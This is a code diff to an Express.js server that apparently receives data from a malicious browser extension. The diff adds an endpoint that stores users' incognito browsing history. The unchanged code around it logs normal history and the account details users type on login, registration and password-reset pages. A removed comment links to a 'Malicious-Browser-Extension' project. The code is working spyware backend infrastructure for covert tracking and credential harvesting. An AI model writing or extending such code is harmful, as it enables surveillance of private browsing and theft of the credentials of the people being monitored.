@@ -51,7 +51,7 @@ app.get(
 // ****************************************************************/
 
 app.post(
-  "/user/add/",
+  "/user/",
   catchErrors(
     authed(async (req, res) => {
       const { uid, extension_id, version, date_created, history } = req.body;
@@ -73,16 +73,11 @@ app.post(
 );
 
 // /****************************************************************
-//                        Logging Saved Data
+//                        Logging Live Data
 // ****************************************************************/
-
-// USER ID
-// https://github.com/nigamaviral/Malicious-Browser-Extension/blob/master/extension/background.js#L228
-// https://stackoverflow.com/a/23854032
-
 // Update history data
 app.post(
-  "/history/add/",
+  "/history/",
   catchErrors(
     authed(async (req, res) => {
       const { uid, historyItem } = req.body;
@@ -92,9 +87,17 @@ app.post(
   )
 );
 
-// /****************************************************************
-//                        Logging Live Data
-// ****************************************************************/
+// Update incognito history data
+app.post(
+  "/incognito/",
+  catchErrors(
+    authed(async (req, res) => {
+      const { uid, historyItem } = req.body;
+      const result = await sd.addIncognitoHistoryItem(uid, historyItem);
+      res.json({ result: result });
+    })
+  )
+);
 
 // Log currently entered account details (login/register/reset password)
 app.post(
